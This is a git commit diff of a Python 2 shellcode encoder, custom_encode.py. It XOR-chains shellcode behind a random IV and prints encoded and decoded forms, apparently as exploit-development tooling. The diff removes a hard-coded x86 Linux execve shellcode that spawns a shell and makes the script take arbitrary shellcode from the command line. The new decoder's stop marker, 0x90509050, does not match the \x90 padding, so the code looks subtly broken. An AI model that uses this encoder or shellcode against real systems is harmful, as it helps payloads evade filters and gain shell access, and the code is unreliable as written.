2fc1a8ee116dcfed5b0da273c21bd6a542961bbe
Tim Ip <2239274+timip@users.noreply.github.com>
2017-09-07 14:15:25 -0700

    Update custom_encode.py

--- custom_encode.py
+++ custom_encode.py
@@ -1,70 +1,78 @@
 #!/usr/bin/python
 
 from random import randint
-
-shellcode = "\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+import sys
 
 def fbxencode(shellcode):
+
         iv = '%x' % randint(1,0xffffffff)
         t = iter(iv)
         iv = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
+
         while ('\\x00' in iv):
                 iv = '%x' % randint(1,0xffffffff)
                 t = iter(iv)
                 iv = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
-	#iv = "\\xaa\\x57\\x2c\\x56"
-        code = iv + shellcode + '\\x90' * (4 - shellcode.count('\\x') % 4 + 4)
 
-        print code
-
-        code = code.replace('\\x', '')
+        ivshellcode = iv + shellcode + '\\x90' * (4 - (len(shellcode)/4) % 4 + 4)
+        ivshellcode = ivshellcode.replace('\\x', '')
 
         blocks = []
-        for i in range(0, len(code)/8):
-                blocks.append(int('0x'+ code[i*8:i*8+8], 16))
-
-	# print "BLOCKS[0]=" + format(blocks[0], '08x')
+        for i in range(0, len(ivshellcode)/8):
+                blocks.append(int('0x'+ ivshellcode[i*8:i*8+8], 16))
         for i in range(len(blocks)-1):
                 blocks[i+1] = (blocks[i] ^ blocks[i+1])
-		# print "BLOCKS[" + str(i+1) + "]=" + format(blocks[i+1], '08x')
 
-	ciphertext = ""
+	encoded = ""
 	for i in range(len(blocks)):
-		ciphertext += format(blocks[i], '08x')
-	# print(ciphertext)
+		encoded += format(blocks[i], '08x')
 
-        t = iter(ciphertext)
-	print "Ciphertext = " + '0x' + ',0x'.join(a+b for a,b in zip(t, t))
-	t = iter(ciphertext)
-        ciphertext = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
-        return ciphertext
+        return encoded 
 
-def fbxdecode(ciphertext):
-
-	ciphertext = ciphertext.replace('\\x','')
+def fbxdecode(encoded):
 
         blocks = []
-	plaintext = ""
+	cleartext = ""
 
-        for i in range(0, len(ciphertext)/8):
-                blocks.append(int('0x'+ ciphertext[i*8:i*8+8], 16))
+        for i in range(0, len(encoded)/8):
+                blocks.append(int('0x'+ encoded[i*8:i*8+8], 16))
 
         for i in range(len(blocks)-1):
-		if (blocks[i] ^ blocks[i+1] == 0x90909090):
+		if (blocks[i] ^ blocks[i+1] == 0x90509050):
 			break
                 blocks[i] = (blocks[i] ^ blocks[i+1])
-                # print "BLOCKS[" + str(i) + "]=" + format(blocks[i], '08x')
-                plaintext += format(blocks[i], '08x')
+                cleartext += format(blocks[i], '08x')
 
-	print(plaintext)
+        return cleartext 
 
-        t = iter(plaintext)
-        plaintext = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
-        return plaintext
+if (len(sys.argv) != 2):
+	print "Usage: ./" + sys.argv[0] + " \"<ShellCode>\""
+	exit()
 
-print "Shellcode = " + shellcode
+shellcode = sys.argv[1]
 
-ciphertext = fbxencode(shellcode)
-print "Ciphertext = " + ciphertext
-plaintext = fbxdecode(ciphertext)
-print "Plaintext = " + plaintext
+if '\\' not in shellcode:
+	print "[!] Use need to use double quotes or single quotes in shellcode"
+	exit()
+
+print "\n[Shellcode]"
+print shellcode + "\n"
+
+encoded = fbxencode(shellcode)
+t = iter(encoded)
+encoded_format = '0x' + ',0x'.join(a+b for a,b in zip(t, t))
+while "0x00" in encoded_format:
+	encoded = fbxencode(shellcode)
+	t = iter(encoded)
+	encoded_format = '0x' + ',0x'.join(a+b for a,b in zip(t, t))
+
+print "[Encoded]"
+t = iter(encoded)
+print '0x' + ',0x'.join(a+b for a,b in zip(t, t))
+t = iter(encoded)
+print '\\x' + '\\x'.join(a+b for a,b in zip(t, t)) + "\n"
+
+decoded = fbxdecode(encoded)
+t = iter(decoded)
+print "[Decoded]"
+print '\\x' + '\\x'.join(a+b for a,b in zip(t, t)) + "\n"
